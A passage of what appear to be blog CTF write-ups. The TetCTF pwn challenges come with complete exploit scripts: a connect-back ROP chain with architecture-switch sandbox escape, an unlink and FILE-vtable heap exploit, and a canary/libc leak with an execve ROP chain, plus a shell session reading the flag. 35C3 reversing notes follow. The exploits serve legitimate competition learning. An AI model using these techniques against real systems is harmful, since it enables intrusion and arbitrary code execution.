I’m not sure where to go from here. Maybe the param to /info is read into a global buffer and it wasn’t lock properly. So we can somehow cause a race to make the server open secret/flag while checking some path that starts with our IP?Baby Sandbox The program is just a simple stack buffer overflow. 64-bit, only NX so we can probably ROP. It’s also statically linked so there is likely to be enough gadgets. The sandbox has all protections on. The following syscalls are filtered: 59: sys_execve 322: stub_execveat 2 with flag: sys_open 257 with flag: sys_openat 304 with flag: sys_open_by_handle_at 57: sys_fork 58: sys_vfork 56: sys_clone 86: sys_link 0xb: munmap in x64 and execve in x86 I ended up building a super dirty ROP chain to read more payload from another connection. That’s the hardest part because of the limited payload length. After that, it’s easy to make fixed memory segments executable and execute shellcode on that. The interesting sandbox bypassing techniques I’ve learned while researching for this challenge: Change the architecture so the syscall number is different and won’t be blacklisted. Kill the parent process Fork itself from __future__ import print_functionfrom pwn import *import osGDBSCRIPT = &quot;&quot;&quot;b * 0x400bcb&quot;&quot;&quot;HOST = &#39;sandbox.chung96vn.cf&#39;PORT = 1337BIN = &#39;./program&#39;addrs = { &#39;pushrsp&#39;: 0x450523, &#39;poprax&#39;: 0x4150d4, &#39;poprdi&#39;: 0x400686, &#39;subraxrdi&#39;: 0x4405b8, &#39;pushraxpoprbx&#39;: 0x488025, &#39;pushrbx&#39;: 0x44ad4f, &#39;poprdxpoprsi&#39;: 0x44b879, &#39;syscall&#39;: 0x4748a5, &#39;mprotect&#39;: 0x44a0c0, &#39;ret&#39;: 0x400bcb, &#39;poprsitordi&#39;: 0x446a5b, &#39;poprsi&#39;: 0x4100d3, &#39;addeax1&#39;: 0x474301, &#39;poprsp&#39;: 0x401d53, &#39;poprsi&#39;: 0x4100d3, &#39;poprdx&#39;: 0x44b856, &#39;adddhbl&#39;: 0x40058e, &#39;syscallpoprdxpoprsi&#39;: 0x44b877, &#39;movrsirbxsyscall&#39;: 0x047f52f}base = 0x6b6000if os.environ.has_key(&#39;remote&#39;): r = remote(HOST, PORT)else: e = ELF(BIN) r = process([&quot;./sandbox&quot;, e.path])if os.environ.has_key(&#39;debug&#39;): gdb.attach(r, gdbscript=GDBSCRIPT)def pivotstack(): payload = &quot;&quot; payload += p64(addrs[&#39;poprdi&#39;]) payload += p64(base) # pop struct sockaddr_in payload += p64(addrs[&#39;poprsi&#39;]) payload += p64(0x0100007f5c110002) payload += p64(addrs[&#39;poprsitordi&#39;]) # open socket payload += p64(addrs[&#39;poprax&#39;]) payload += p64(0x29) payload += p64(addrs[&#39;poprdxpoprsi&#39;]) payload += p64(0) payload += p64(1) payload += p64(addrs[&#39;poprdi&#39;]) payload += p64(2) payload += p64(addrs[&#39;syscallpoprdxpoprsi&#39;]) # connect payload += p64(0x10) payload += p64(base) payload += p64(addrs[&#39;poprdi&#39;]) payload += p64(0) payload += p64(addrs[&#39;poprax&#39;]) payload += p64(0x2a) payload += p64(addrs[&#39;syscall&#39;]) # read payload += p64(addrs[&#39;poprdx&#39;]) payload += p64(0x600) payload += p64(addrs[&#39;syscall&#39;]) # pivot payload += p64(addrs[&#39;poprsp&#39;]) payload += p64(base) return payloaddef realropchain(): payload = &quot;&quot; # Test write payload += p64(addrs[&#39;poprax&#39;]) payload += p64(1) payload += p64(addrs[&#39;poprdx&#39;]) payload += p64(0x50) payload += p64(addrs[&#39;syscall&#39;]) # mprotect 0x1000 bytes starting at 0x6bc3f0 payload = &quot;&quot; payload += p64(addrs[&#39;poprdxpoprsi&#39;]) payload += p64(0x7) payload += p64(0x600) payload += p64(addrs[&#39;poprdi&#39;]) payload += p64(base) payload += p64(addrs[&#39;poprax&#39;]) payload += p64(10) payload += p64(addrs[&#39;syscall&#39;]) payload += p64(base + 0x50) payload += &#39;\\x90&#39; * 8 print(context.arch) context.arch = &#39;amd64&#39; sc64 = &quot;&quot;&quot; mov DWORD PTR [rsp + 4], 0x23 mov DWORD PTR [rsp], {} retf &quot;&quot;&quot;.format(base + 0x100) payload += asm(sc64) payload = payload.ljust(0x100, &#39;\\x90&#39;) context.clear() sc32 = &quot;&quot;&quot; mov eax, 63 mov ebx, 1 xor ecx, ecx int 0x80 mov eax, 63 mov ebx, 2 xor ecx, ecx int 0x80 &quot;&quot;&quot; payload += asm(sc32) payload += asm(shellcraft.i386.linux.readfile(&#39;/etc/passwd&#39;, 0)) payload = payload.ljust(0x300, &#39;\\x90&#39;) return payloaddef main(): l = listen(4444) payload = &#39;A&#39; * (8 * 7) ropchain = pivotstack() payload += ropchain print(&quot;len payload = {}&quot;.format(len(payload))) raw_input(&#39;pwn?&#39;) r.sendline(payload) payload = realropchain() print(&quot;len payload 2 = {}&quot;.format(len(payload))) l.sendline(payload) r.interactive() r.close()if __name__ == &#39;__main__&#39;: main()Babyheap This is a typical heap challenge interface with a jump table: alloc edit delete show Alloc: Doesn’t prompt for a size. Also doesn’t have canary (strange…) Alloc fixed size of 0x98 and store in a global array, max 6 chunks Edit: Delete: Free then set 0 at the global array Show: Magic: %ld Content: %s The size of the allocated memory is exactly the sum of the member sizes. When using scanf, the last newline byte will be replaced with a null byte, results in 1-byte overflow into the next chunk’s size. This is glibc 2.23 so we can use the main_arena leak: Allocate 2 chunks. Free the first chunk then allocate again. Show the first chunk and the address of main_arena will be shown. The first idea I’ve got about the one-byte overflow is to first allocate some chunks of the same size, and then free 2 in the between, then modify the marginal chunks to overwrite the header of the freed chunks so when we allocate again, malloc will return a different pointer than we usually expect. Something can probably be done based on the “shrinking free chunks” attack. But since the malloc size is fixed here, to get larger freed chunks, we can allocate and free 2 consecutive chunks so they coalesce. To bypass the p-&amp;gt;next-&amp;gt;prevsize == p-&amp;gt;size check, we need to add fake prevsize to the chunk in between before freeing it. Real size is 0xa0 Heap can be leaked by allocating at least 3 chunks and free 2 non-consecutives so the fd and bk in each are populated. Then allocate the chunk again and dump it. Need to allocate 5 chunks so when freeing 3, top chunk is not coalesced Need to fix fd and bk of chunk 1 to manipulate the unlink whatever in the fd and bk will be put onto the unsorted bin after the unlink. Then the thing in it will be returned in the next malloc fd + 8 * 4 == fd -&amp;gt; bk == P bk + 8 * 3 == bk -&amp;gt; fd == P fd -&amp;gt; bk = bk bk -&amp;gt; fd = fd Layout: 0x000: Chunk 0 0x0a0: Chunk 1 0x140: Chunk 2 0x1e0: Chunk 3 0x280: Chunk 4 0x320: Chunk 5 Need 0x1a0 to be 0x100 to be persistent with Chunk 1&#39;s size malloc_hook malloc_hook + 8 main_arena main_arena + 8 I’ve just figured out that we can corrupt the prev_size of the next chunk as well, in addition to the first byte of the size to be 0. Shrink size of the free chunk or current chunk. Oh man I’ve just figured out, too, that it’s not an off-by-one but off by many wtf. Okay here’s a new approach alloc 0 1 2 make fake chunk inside 1 0 1 corrupted fake chunk(s) corrupt size of 1 using 0 free 1 Corrupt size to make 1 a fast chunk?? Then make more fast chunks to turn this into a fastbin attack? So the idea is to eventually make a chunk of 2 different size appear in the unsorted bin so when 1 get allocated, the other still in the free list and we can manipulate it to create a fake chunk inside and then get it to return a desired pointer. SO here’s another approach Allocate all chunks. The target is to corrupt the prev_size of chunk 4 to 0x200 so when we free it, we have to to unlink a fake chunk at 0x320 - 0x200 = 0x120 Fake chunk will be created inside chunk 1 Shrink a chunk and do the thing and free it so it unlink with the fake chunk Can’t overwrite the prev_size if the prev chunk is freed :( Wait. If I can overlap with the top chunk so I can control 2 chunk while it’s both free and allocated :o SO new plan Get the overlap at chunk 1 When allocate again chunk 2 is the same as chunk 1 Allocate 3 and 4 then do the trick above. Free 2 so the prev_in_use bit is unset be we can still overwrite the prev_size. This will allow 3 to unlink a fake chunk when we free it. Surprisingly freeing the overlap chunk put it in unsorted bin and we can control the bins while it’s on the free list. Here we go Now I can write a pointer to the heap (actually it’s address of main_arena) to what seems like an arbitrary location Alright so eventually I’ve found out that it’s a FILE structure exploit where I can overwrite _IO_list_all with the address of an unsorted bin. We can get the shell by triggering an error and all the file pointers will be closed. Basically we’ll overwrite the address of _IO_OVERFLOW in the FILE vtable with system. In addition, we need to forge a FILE structure to satisfy some condition so the overwritten _IO_OVERFLOW function is called. The FILE structure will be at the smallbin of size 0x60 (smallbin[4]) Need vtable address at 0x218 Actually what we did is pointing _IO_list_all to a fake filestream and a fake vtable and in that vtable the entry of _IO_OVERFLOW is system as we set it up.from __future__ import print_functionfrom pwn import *import osGDBSCRIPT = &quot;&quot;&quot;&quot;&quot;&quot;HOST = &#39;18.136.126.78&#39;PORT = 1336BIN = &#39;./pwn03&#39;LIBC = &#39;./libc-2.23.so&#39;ALLOC = &#39;1&#39;EDIT = &#39;2&#39;REMOVE = &#39;3&#39;SHOW = &#39;4&#39;EXIT = &#39;5&#39;PROMPT = &#39;YOUR CHOICE : &#39;libc = ELF(LIBC)addrs = { &#39;mainarena&#39;: 0x3c4b78, &#39;mallochook&#39;: libc.symbols[&#39;__malloc_hook&#39;], &#39;stdin&#39;: 0x3c48e0, &#39;iolistall&#39;: 0x3c5520, &#39;system&#39;: libc.symbols[&#39;system&#39;]}if os.environ.has_key(&#39;remote&#39;): r = remote(HOST, PORT)else: e = ELF(BIN) r = process(e.path)if os.environ.has_key(&#39;debug&#39;): gdb.attach(r, gdbscript=GDBSCRIPT)def optalloc(): r.recvuntil(PROMPT) r.sendline(ALLOC) if &#39;FULL&#39; in r.recvline(): print(&#39;ALLOC FAILED&#39;)def optedit(idx, magic, content, l=True): r.recvuntil(PROMPT) r.sendline(EDIT) r.recvuntil(&#39;Index : &#39;) r.sendline(str(idx)) r.recvuntil(&#39;Magic : &#39;) r.sendline(str(magic)) r.recvuntil(&#39;Content : &#39;) if l: r.sendline(content) else: r.send(content)def optremove(idx): r.recvuntil(PROMPT) r.sendline(REMOVE) r.recvuntil(&#39;Index : &#39;) r.sendline(str(idx))def optshow(idx): r.recvuntil(PROMPT) r.sendline(SHOW) r.recvuntil(&#39;Index : &#39;) r.sendline(str(idx)) data = r.recvuntil(&#39;\\nMENU&#39;).split(&#39;\\n&#39;)[:2] magic = int(data[0].split(&#39;Magic : &#39;)[1]) content = data[1].split(&#39;Content : &#39;)[1].ljust(8, &#39;\\x00&#39;) content = u64(content) return (magic, content)def optexit(): r.recvuntil(PROMPT) r.sendline(EXIT)def leak(): optalloc() # 0 optalloc() # 1 optalloc() # 2 optalloc() # 3 optremove(0) # -0 optremove(2) # -2 optalloc() # 0 leakptrs = optshow(0) libcbase = leakptrs[0] - addrs[&#39;mainarena&#39;] heapbase = leakptrs[1] - 0x140 return (libcbase, heapbase) def heapexp(): global libcbase global heapbase addrs[&#39;system&#39;] += libcbase payload = p64(0) * 4 payload += p64(heapbase + 0x220 - 0x18) payload += p64(addrs[&#39;system&#39;]) optedit(3, 0x0, payload) optalloc() # 2 # By pass prev_size vs size when dealing with chunk 1 later # If it&#39;s freed, it&#39;ll be checked payload = &#39;A&#39; * (0x1a0 - 0x158) payload += p64(0x100) optedit(2, 0x13371, payload) # Consolidate 1 and 2 to get size 0x140 optremove(1) optremove(2) # Overwrite first time chunk1 = heapbase + 0xa0 payload = p64(chunk1) payload = payload.ljust(144, &#39;B&#39;) optedit(0, chunk1, payload) # Populate chunk 1 with the correct fd and bk payload = p64(heapbase) optalloc() # 1 optedit(1, heapbase, payload) # Free 3 so it consolidate with top chunk and chunk 1 # because of the incorrect size. After this, chunk 1 # will overlap with top chunk. Another alloc will make # chunk 2 the same as chunk 1 optremove(3) optalloc() # 2 # Do the trick optalloc() # 3 # Set prev_in_use of chunk 3 to 0 # This also put chunk 1/2 to unsorted bin optremove(2) # Modify prev_size of chunk 3 addrs[&#39;iolistall&#39;] += libcbase print(&#39;iolistall @ {:#x}&#39;.format(addrs[&#39;iolistall&#39;])) payload = p64(addrs[&#39;iolistall&#39;] - 0x10) payload += &#39;A&#39; * 8 optedit(1, 0x13373, payload) # Alloc so _IO_list_all is overwritten to main_arena optalloc() # 2 # Now we need to fake a FILE at chunk 3 (0x140) # Edit chunk 1/2 to write /bin/sh to the beginning of chunk 3 payload = &#39;F&#39; * (144 - 8) payload += &#39;/bin/sh&#39; optedit(2, 0x1336, payload) # Craft filestream # Magic: _IO_read_end # _IO_read_base fs = p64(addrs[&#39;iolistall&#39;] - 0x10) fs += p64(0) + p64(1) # _IO_write_base &amp;lt; _IO_write_ptr fs = fs.ljust(143, &#39;\\x00&#39;) optedit(3, 0x0, fs) r.interactive() def main(): raw_input(&#39;pwn?&#39;) global libcbase global heapbase libcbase, heapbase = leak() print(&quot;libc @ {:#x}&quot;.format(libcbase)) print(&quot;heap @ {:#x}&quot;.format(heapbase)) heapexp() r.close()if __name__ == &#39;__main__&#39;: main()Babyfirst The binary has all protections on. The binary implements its own read function. The binary reads a password of length 0x20 from /dev/urandom Login function: If the username starts with admin then prompt for a password. Otherwise save the username to the buffer and count that as a logged in user. Leak password: Input an accepted username of length 0x20 so it reaches the password buffer. The username must not starts with admin so it can be saved to the buffer without a password. Choose to play so the username with the password is printed out. Play function: It reads input of length 128 maximum and output it. This is stack overflow so we can leak the canary, binary base and libc base all in here. After that, this can be a normal BoF challenge. Before:0x0d60806019c93615 0xef683548a35d647c0x44346fe9e7682bf5 0x899ccab9462b6744After:0x0d60806019c93615 0xef683548a35d647c0x44346fe9e7682bf5 0x899ccab9462b6744exploit.py:from __future__ import print_functionfrom pwn import *import osGDBSCRIPT = &quot;&quot;&quot;&quot;&quot;&quot;HOST = &#39;babyfirst.chung96vn.cf&#39;PORT = 31337BIN = &#39;./babyfirst&#39;LIBC = &#39;./libc-2.27.so&#39;PROMPT = &#39;Your choice: &#39;LOGIN = &#39;1&#39;PLAY = &#39;2&#39;EXIT = &#39;3&#39;bin_offset = 0xfc0libc_offset = 0x21b97libc = ELF(LIBC)addrs = { &#39;system&#39;: libc.symbols[&#39;system&#39;], &#39;binsh&#39;: libc.search(&#39;/bin/sh&#39;).next(), &#39;poprdi&#39;: 0x000000000002155f, &#39;poprax&#39;: 0x00000000000439c8, &#39;poprsi&#39;: 0x0000000000023e6a, &#39;poprdx&#39;: 0x0000000000001b96, &#39;syscall&#39;: 0x00000000000d2975}if os.environ.has_key(&#39;remote&#39;): r = remote(HOST, PORT)else: e = ELF(BIN) r = process(e.path, env={&#39;LD_PRELOAD&#39;: LIBC})if os.environ.has_key(&#39;debug&#39;): gdb.attach(r, gdbscript=GDBSCRIPT)def login(username, password=None): r.recvuntil(PROMPT) r.sendline(LOGIN) r.recvuntil(&#39;User Name: &#39;) r.sendline(username) if password != None: r.recvuntil(&#39;Password: &#39;) r.sendline(password)def play(play=None, payload=None): r.recvuntil(PROMPT) r.sendline(PLAY) if play == None: return r.recvuntil(&#39;Test Version only support for admin~&#39;) r.recvuntil(&#39;Content: &#39;) # Leak stack payload = &#39;A&#39; * (8 * 4) r.send(payload) stack = r.recvuntil(&#39;\\n&#39;).split(payload)[1] if len(stack) &amp;lt; 6: print(&quot;LEAK STACK FAILED&quot;) exit(1) stack = stack[:6].ljust(8, &#39;\\x00&#39;) stack = u64(stack) - 0x140 print(&quot;STACK = {}&quot;.format(hex(stack))) # Leaking canary payload = &#39;A&#39; * (8 * 5 + 1) r.send(payload) canary = r.recvuntil(&#39;\\n&#39;).split(payload)[1] if len(canary) &amp;lt; 7: print(&quot;LEAK CANARY FAILED&quot;) exit(1) canary = canary[:7].rjust(8, &#39;\\x00&#39;) canary = u64(canary) print(&quot;CANARY = {}&quot;.format(hex(canary))) # Leaking binary payload = &#39;A&#39; * (8 * 12) r.send(payload) binleak = r.recvuntil(&#39;\\n&#39;).split(payload)[1] if len(binleak) &amp;lt; 6: print(&quot;LEAK BINARY FAILED&quot;) exit(1) binleak = binleak[:6].ljust(8, &#39;\\x00&#39;) binleak = u64(binleak) print(&quot;BINLEAK = {}&quot;.format(hex(binleak))) binbase = binleak - bin_offset print(&quot;BIN BAsE = {}&quot;.format(hex(binbase))) # Leaking libc payload = &#39;A&#39; * (8 * 13) r.send(payload) libcleak = r.recvuntil(&#39;\\n&#39;).split(payload)[1] if len(libcleak) &amp;lt; 6: print(&quot;LEAK LIBC FAILED&quot;) exit(1) libcleak = u64(libcleak[:6].ljust(8, &#39;\\x00&#39;)) print(&quot;LIBCLEAK = {}&quot;.format(hex(libcleak))) libcbase = libcleak - libc_offset print(&quot;LIBC BASE = {}&quot;.format(hex(libcbase))) for k in addrs.keys(): addrs[k] += libcbase payload = &#39;A&#39; * (8 * 2) payload += p64(addrs[&#39;binsh&#39;]) payload += &#39;\\x00&#39; * (8 * 2) payload += p64(canary) payload += &#39;B&#39; * 8 payload += p64(addrs[&#39;poprdi&#39;]) payload += p64(addrs[&#39;binsh&#39;]) payload += p64(addrs[&#39;poprsi&#39;]) payload += p64(stack + 0x10) payload += p64(addrs[&#39;poprdx&#39;]) payload += p64(0x0) payload += p64(addrs[&#39;poprax&#39;]) payload += p64(59) payload += p64(addrs[&#39;syscall&#39;]) assert len(payload) &amp;lt;= 128 r.send(payload) print(repr(r.recvuntil(&#39;\\n&#39;))) print(&quot;END==&quot;) r.sendline(&#39;END&#39;) print(r.recvuntil(&#39;\\n&#39;)) r.interactive()def exit(): r.recvuntil(PROMPT) r.sendline(EXIT)def leakpass(): login(&#39;A&#39; * 32) leak = play() leak = leak.split(&#39;A&#39; * 32)[1].split(&#39;\\nTest Version only support for admin~&#39;)[0] if len(leak) &amp;lt; 0x10: print(&quot;LEAK PASSWORD FAILED&quot;) return None leak = leak[:0x10] return leakdef main(): raw_input(&quot;pwn?&quot;) password = leakpass() print(&quot;PASSWORD: {}&quot;.format(password.encode(&#39;hex&#39;))) login(&quot;admin&quot;, password) play(play=True) r.close()if __name__ == &#39;__main__&#39;: main()➜ babyfirst remote=1 python exploit.py[*] &#39;/home/me/Desktop/tetctf/babyfirst/libc-2.27.so&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to babyfirst.chung96vn.cf on port 31337: Donepwn?PASSWORD: ead76d78b8c95156fc838dd20e633463STACK = 0x7ffdf4dbd4a0CANARY = 0x2963933cecc44c00BINLEAK = 0x55b917de2fc0BIN BAsE = 0x55b917de2000LIBCLEAK = 0x7fe18044cb97LIBC BASE = 0x7fe18042b000&#39;AAAAAAAAAAAAAAAA\\x9a\\xee]\\x80\\xe1\\x7f\\n&#39;END==END[*] Switching to interactive modeEvery things is OK~~$ lsbinbootdevetchomeinit.shliblib64mediamntoptprocrootrunsbinsrvsystmpusrvar$ ls -latotal 80drwxr-xr-x 1 root root 4096 Dec 29 02:15 .drwxr-xr-x 1 root root 4096 Dec 29 02:15 ..-rwxr-xr-x 1 root root 0 Dec 29 02:15 .dockerenvdrwxr-xr-x 2 root root 4096 Nov 12 20:56 bindrwxr-xr-x 2 root root 4096 Apr 24 2018 bootdrwxr-xr-x 5 root root 340 Dec 29 02:15 devdrwxr-xr-x 1 root root 4096 Dec 29 02:15 etcdrwxr-xr-x 1 root root 4096 Dec 29 02:15 home-rwxr-xr-x 1 root root 54 Dec 29 02:12 init.shdrwxr-xr-x 1 root root 4096 Nov 12 20:54 libdrwxr-xr-x 2 root root 4096 Nov 12 20:55 lib64drwxr-xr-x 2 root root 4096 Nov 12 20:54 mediadrwxr-xr-x 2 root root 4096 Nov 12 20:54 mntdrwxr-xr-x 2 root root 4096 Nov 12 20:54 optdr-xr-xr-x 120 root root 0 Dec 29 02:15 procdrwx------ 1 root root 4096 Dec 31 17:27 rootdrwxrwxr-- 1 root root 4096 Dec 29 02:15 rundrwxr-xr-x 1 root root 4096 Nov 19 21:20 sbindrwxr-xr-x 2 root root 4096 Nov 12 20:54 srvdr-xr-xr-x 13 root root 0 Dec 31 18:54 sysdrwx-wx-wt 1 root root 4096 Dec 25 09:48 tmpdrwxr-xr-x 1 root root 4096 Nov 12 20:54 usrdrwxr-xr-x 1 root root 4096 Nov 12 20:56 var$ cd /home$ lsbabyfirst$ cd babyfirst$ lsbabyfirstflagrun.sh$ ls -latotal 52drwxr-x--- 1 root babyfirst 4096 Dec 31 17:37 .drwxr-xr-x 1 root root 4096 Dec 29 02:15 ..-rwxr-x--- 1 root babyfirst 220 Apr 4 2018 .bash_logout-rwxr-x--- 1 root babyfirst 3771 Apr 4 2018 .bashrc-rwxr-x--- 1 root babyfirst 807 Apr 4 2018 .profile-rwxr-x--- 1 root babyfirst 13448 Dec 31 17:36 babyfirst-r--r----- 1 root babyfirst 25 Dec 29 02:21 flag-rwxr-x--- 1 root babyfirst 67 Dec 29 02:15 run.sh$ cat flagTetCTF{Y0U_4r3_N0T_Baby}$ cat run.sh#!/bin/sh#exec 2&amp;gt;/dev/nulltimeout 60 /home/babyfirst/babyfirst[*] Got EOF while reading in interactive$ Initially I made a call to system(&quot;/bin/sh&quot;) but it didn’t work. My guest was that this new glibc 2.27 does some additional checks so the function can’t be called directly like that. That’s why I ended up doing a sys_execve instead." }, { "title": "35C3 CTF", "url": "/posts/35C3-CTF/", "categories": "CTF, reversing", "tags": "ctf, reversing, radare2", "date": "2018-12-30 11:01:14 +0800", "snippet": "This is my first time participating in C3 CTF. Although I wasn’t able to solve many challenges within the time of the CTF, I still find the challenges really awesome and exciting. I wanted to solve pwnable challenges with the hope to learn more about exploit development of real applications, but ended up solving 2 RE ones. Here is my writeup for them :)RE - CorebotThis challenge is a 32-bit Windows binary. When I tried running the binary for the first time, it was odd because it didn’t prompt for any input and just printed out NOPE. However, the logic of the binary is pretty straight forward: There is a sequence of API calls to crypto-related functions such as: CryptAcquireContext CryptImportKey CryptSetKeyParam CryptDecrypt There is a API call to GetVolumeInformation to get information of the partition that the binary is on. Only the serial number of the volume is relevant to the rest of the challenge. The binary performs some comparison at the end of the _start function after decrypting some data. It will print out NOPE. if the decrypted data doesn’t starts with some predefined bytes (in this case, it is the flag prefix 35C3)This reminds me a lot of level 4 of this year Flare-on challenge, which was also a windows binary involving some data decryption. Although this is much simpler, there are at least these 2 ways to solve this: Statically reverse engineer the encryption and figure out what is the correct input that satisfies the condition after some data is decrypted. Bruteforce the input.The problem now is to find what data affect the comparison since it doesn’t prompt for any user input. It turned out that the binary use the serial number mentioned above to carry out the calculation. The serial number is a 32-bit integer. However, only the lower 16-bit (or 2 bytes) are used for the calculationWith only 2 bytes being used, I chose to bruteforce the data immediately. This time, I decided to use the radare2 scripting engine r2pipe to solve this so that I can learn it at the same time. r2pipe is really awesome because it can actually carry out commands as if you were interacting with radare2 to debug the binary. Since there is no user input, the data has to be modified during execution. The idea is to set a breakpoint right after the program get the serial number and modify the register accordingly.I am certain that my script can be further optimized, but it was good enough to solve the challenge in-time. There were a few problems that I encountered while writing the script: The code is unmapped before it was execute so I have to figure out the mapped addresses to set the necessary breakpoints. The script run fairly slowly because I have to open a whole new radare2 process for every trial. I think there is a way to redirect the execution so that it doesn’t have to run from scratch like that, but reuses the data it obtained before. I optimized it a little bit by running 2 threads and printing the output while it is running. I’ve tried with more threads but it bugged out after a while. While it was still running, I looked for the flag string in the output and figured out the flag and the correct bytes to be 0x25c3. The flag is 35C3_MalwareAuthorKryptoChef.If you know of a way that I can further optimize this, I would love to know since this is my first time solving a challenge with r2pipe.Anyway, here’s the script:from __future__ import print_functionimport r2pipefrom multiprocessing.dummy import Pool as ThreadPoolhook_1 = 0x19ahook_2 = 0x13fflags = []def r2Breakpoint(r2, addr): r2.cmd(&#39;db {}&#39;.format(addr))def solve(key): r2 = r2pipe.open(&#39;corebot.exe&#39;, flags=[&#39;-2&#39;]) r2.cmd(&#39;aaa&#39;) r2.cmd(&#39;doo&#39;) r2.cmd(&#39;dc&#39;) # Figure out the mapped addresses memmap = r2.cmd(&#39;dm&#39;).split(&#39;\\n&#39;) memmap = [x for x in memmap if &#39;corebot.exe&#39; in x and &#39;.text&#39; in x][0] memmap = memmap.split(&#39;-&#39;)[0] memmap = int(memmap, 16) # Then set the breakpoints r2Breakpoint(r2, hex(memmap + hook_1)) r2Breakpoint(r2, hex(memmap + hook_2)) r2.cmd(&#39;dc&#39;) # The breakpoint is hit. Modify the register here eax = r2.cmd(&#39;dr?eax&#39;) eax = int(eax, 16) eax = (eax &amp;gt;&amp;gt; 16) &amp;lt;&amp;lt; 16 eax += key seteax = &#39;dr eax={}&#39;.format(hex(eax)) r2.cmd(seteax) eax = r2.cmd(&#39;dr?eax&#39;) # Continue running and hit the breakpoint where the output is going to be printed out. # Fetch the output then print it out. r2.cmd(&#39;dc&#39;) buffer = r2.cmd(&#39;pv @esp+4&#39;) flag = r2.cmd(&#39;pvz @{}&#39;.format(buffer)) r2.cmd(&#39;q&#39;) print(key, flag) return str(key), flagdef main(): pool = ThreadPool(2) results = pool.map(solve, range(0x10000)) pool.close() pool.join() for r in results: print(repr(r)) f = open(&#39;output.txt&#39;, &#39;wb&#39;) f.write(&#39;&#39;.join([&#39; == &#39;.join(x) for x in results])) f.close()if __name__ == &#39;__main__&#39;: main()# 0x25c3RE - 0packThis is not a hard challenge, but it’s still a little bit tricky to solve. When I opened the binary in a disassembler, the functions were all 0 as described. Running the binary and giving it some dummy input resulted in the string Awwww ಠ_ಠ to be printed.As expected, this is some kind of binary packing. I thought the binary will be calling the main function at some point. I gave it a shot by placing a breakpoint at the call to __libc_start_main with the hope that the address of the real main function would be revealed here. And it was. I realized this because of the reference to the prompt Input password:➜ 0pack r2 -A -d 0pack.elfProcess with PID 28177 started...= attach 28177 28177bin.baddr 0x557b2e3d6000Using 0x557b2e3d6000asm.bits 64[ WARNING : block size exceeding max block size at 0x557b2e3d6e7d[+] Try changing it with e anal.bb.maxsize WARNING : block size exceeding max block size at 0x557b2e3d96cc[+] Try changing it with e anal.bb.maxsize WARNING : block size exceeding max block size at 0x557b2e3d89e1[+] Try changing it with e anal.bb.maxsize WARNING : block size exceeding max block size at 0x557b2e3d936b[+] Try changing it with e anal.bb.maxsize WARNING : block size exceeding max block size at 0x557b2e3d7f52[+] Try changing it with e anal.bb.maxsize WARNING : block size exceeding max block size at 0x557b2e3d9b93[+] Try changing it with e anal.bb.maxsize WARNING : block size exceeding max block size at 0x557b2e3d67a8[+] Try changing it with e anal.bb.maxsize WARNING : block size exceeding max block size at 0x557b2e3d752f[+] Try changing it with e anal.bb.maxsize WARNING : block size exceeding max block size at 0x557b2e3d6759[+] Try changing it with e anal.bb.maxsize[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Constructing a function name for fcn.* and sym.func.* functions (aan)[TOFIX: afta can&#39;t run in debugger mode.ions (afta)[x] Type matching analysis for all functions (afta)[x] Use -AA or aaaa to perform additional experimental analysis.= attach 28177 2817728177 -- Wrong argument[0x7f9f17df2090]&amp;gt; db sym.imp.__sym.imp.__stack_chk_fail sym.imp.__libc_start_main sym.imp.__cxa_finalize [0x7f9f17df2090]&amp;gt; db sym.imp.__libc_start_main [0x7f9f17df2090]&amp;gt; dchit breakpoint at: 557b2e3e8770[0x557b2e3e8770]&amp;gt; drrax = 0x0000001crbx = 0x00000000rcx = 0x557b2e3e8e90rdx = 0x7fff8df34b88r8 = 0x557b2e3e8f00r9 = 0x7f9f17e019a0r10 = 0x557b2e3e87b0r11 = 0x00000000r12 = 0x557b2e3d6000r13 = 0x7fff8df34b80r14 = 0x00000000r15 = 0x557b2e3d6000rsi = 0x00000001rdi = 0x557b2e3e89a0rsp = 0x7fff8df34b68rbp = 0x00000000rip = 0x557b2e3e8770rflags = 0x00000202orax = 0xffffffffffffffff[0x557b2e3e8770]&amp;gt; sr rdi;pd 30 ;-- rdi: 0x557b2e3e89a0 55 push rbp 0x557b2e3e89a1 4889e5 mov rbp, rsp 0x557b2e3e89a4 4881eca00000. sub rsp, 0xa0 0x557b2e3e89ab 89bd6cffffff mov dword [rbp - 0x94], edi 0x557b2e3e89b1 4889b560ffff. mov qword [rbp - 0xa0], rsi 0x557b2e3e89b8 64488b042528. mov rax, qword fs:[0x28] ; [0x28:8]=-1 ; &#39;(&#39; ; 40 0x557b2e3e89c1 488945f8 mov qword [rbp - 8], rax 0x557b2e3e89c5 31c0 xor eax, eax 0x557b2e3e89c7 c6857dffffff. mov byte [rbp - 0x83], 1 0x557b2e3e89ce 48b8496e7075. movabs rax, 0x6170207475706e49 ; &#39;Input pa&#39; 0x557b2e3e89d8 48894590 mov qword [rbp - 0x70], rax 0x557b2e3e89dc 48b87373776f. movabs rax, 0x203a64726f777373 ; &#39;ssword: &#39; 0x557b2e3e89e6 48894598 mov qword [rbp - 0x68], rax 0x557b2e3e89ea c645a000 mov byte [rbp - 0x60], 0 0x557b2e3e89ee 488d4590 lea rax, [rbp - 0x70] 0x557b2e3e89f2 4889c6 mov rsi, rax 0x557b2e3e89f5 488d3d180500. lea rdi, [0x557b2e3e8f14] ; &quot;%s&quot; 0x557b2e3e89fc b800000000 mov eax, 0 0x557b2e3e8a01 e85afdffff call sym.imp.printf ; int printf(const char *format) 0x557b2e3e8a06 488b15531620. mov rdx, qword [0x557b2e5ea060] ; section..bss ; [0x557b2e5ea060:8]=0x7f9f17deba00 0x557b2e3e8a0d 488d4580 lea rax, [rbp - 0x80] 0x557b2e3e8a11 be0f000000 mov esi, 0xf ; 15 0x557b2e3e8a16 4889c7 mov rdi, rax 0x557b2e3e8a19 e862fdffff call sym.imp.fgets ; char *fgets(char *s, int size, FILE *stream) 0x557b2e3e8a1e bf0a000000 mov edi, 0xa 0x557b2e3e8a23 e818fdffff call sym.imp.putchar ; int putchar(int c) 0x557b2e3e8a28 0fb64580 movzx eax, byte [rbp - 0x80] 0x557b2e3e8a2c 88857effffff mov byte [rbp - 0x82], al 0x557b2e3e8a32 4c89f8 mov rax, r15 0x557b2e3e8a35 480575240100 add rax, 0x12475[0x557b2e3e89a0]&amp;gt; After a quick look at this function, I made the following observations: The function gets the input then perform byte-by-byte comparison of the input. This is an example of the comparison of 1 byte. If the comparison 